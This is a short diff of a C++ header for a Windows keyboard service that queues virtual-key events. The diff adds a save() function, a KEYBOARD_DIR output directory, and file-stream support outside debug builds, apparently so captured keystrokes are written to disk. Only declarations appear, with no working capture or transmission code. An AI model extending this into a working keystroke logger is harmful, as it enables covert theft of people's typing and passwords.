@@ -1,11 +1,12 @@
 #pragma once
+#include "io.h"
 #include <Windows.h>
 #include <thread>
 #include <list>
 #include <queue>
-#if _DEBUG
+#include <string>
+#include <sstream>
 #include <fstream>
-#endif
 
 namespace services
 {
@@ -23,8 +24,11 @@ namespace services
 		static std::thread vkQueueThread;
 
 		static bool isRunning = false;
+		const char dir[] = KEYBOARD_DIR;
 
+		static size_t vkEvents;
 		static size_t vkRepeats;
+		static size_t vkListCursorBegin;
 		static size_t vkListCursor;
 		static VirtualKeyInfoList vkList;
 		static VirtualKeyInfoQueue vkQueue;
@@ -36,6 +40,7 @@ namespace services
 
 		void run();
 		void stop();
+		void save();
 		void processqueue();
 		void processvk(VirtualKeyInfo vkInfo);
 		void onDelete();
